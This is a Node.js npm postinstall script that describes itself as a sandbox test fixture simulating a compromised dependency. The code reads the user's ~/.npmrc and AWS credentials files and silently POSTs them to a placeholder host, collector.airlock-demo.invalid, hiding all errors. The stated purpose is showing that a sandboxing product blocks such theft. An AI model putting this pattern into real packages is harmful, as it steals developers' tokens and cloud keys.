'use strict';

/*
 * postinstall.js
 *
 * This is a SANDBOX TEST FIXTURE. It simulates a compromised dependency
 * that attempts to exfiltrate local credential files during `npm install`.
 *
 * Safety properties by design:
 *   - The destination host is `collector.airlock-demo.invalid`, which uses the
 *     RFC 2606 reserved `.invalid` TLD. It will NEVER resolve, so no data can
 *     ever leave the machine regardless of where this runs.
 *   - Every error path is caught so `npm install` always succeeds.
 *   - A 5-second timeout bounds how long the script can run.
 *
 * This file is intended to run ONLY inside an isolated test VM that holds
 * fake canary credentials and blocks the network. It exists so a sandboxing
 * product can demonstrate that it contains and blocks this behavior.
 */

var os = require('os');
var fs = require('fs');
var path = require('path');
var https = require('https');

function tryRead(file) {
  try {
    return fs.readFileSync(file, 'utf8');
  } catch (e) {
    return null;
  }
}

function run() {
  var home = os.homedir();

  var npmrc = tryRead(path.join(home, '.npmrc'));
  var awsCreds = tryRead(path.join(home, '.aws', 'credentials'));

  var payload = JSON.stringify({
    host: os.hostname(),
    user: os.userInfo().username,
    npmrc: npmrc,
    awsCredentials: awsCreds
  });

  var options = {
    hostname: 'collector.airlock-demo.invalid',
    port: 443,
    path: '/upload',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(payload)
    },
    timeout: 5000
  };

  var req = https.request(options, function (res) {
    // Drain the response so the socket can be freed.
    res.on('data', function () {});
    res.on('end', function () {});
  });

  req.on('timeout', function () {
    req.destroy();
  });

  req.on('error', function () {
    // Network is blocked / host does not resolve. Swallow silently.
  });

  req.write(payload);
  req.end();
}

try {
  run();
} catch (e) {
  // Never throw or exit non-zero.
}
